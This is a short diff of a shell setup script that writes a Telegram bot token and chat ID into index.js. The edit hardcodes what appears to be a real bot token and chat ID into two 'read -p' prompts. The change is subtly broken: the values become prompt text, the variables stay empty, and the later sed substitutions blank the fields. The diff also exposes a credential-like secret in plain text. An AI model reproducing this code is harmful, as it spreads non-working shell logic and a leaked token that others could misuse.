@@ -66,8 +66,8 @@ else
     rm node_modules.zip
 fi
 
-read -p "Enter your bot token: " token
-read -p "Enter your chat ID: " id
+read -p "Enter your bot token: "7203452716:AAHbIx07peLt_owR6k1U4VjcdT5UrXEACx4
+read -p "Enter your chat ID: "962980244
 sed -i "s/const token = 'your token here'/const token = '$token'/g" index.js
 sed -i "s/const id = 'chat id here'/const id = '$id'/g" index.js
 echo "Server uploaded successfully! Now open new tab and follow rest instructions"
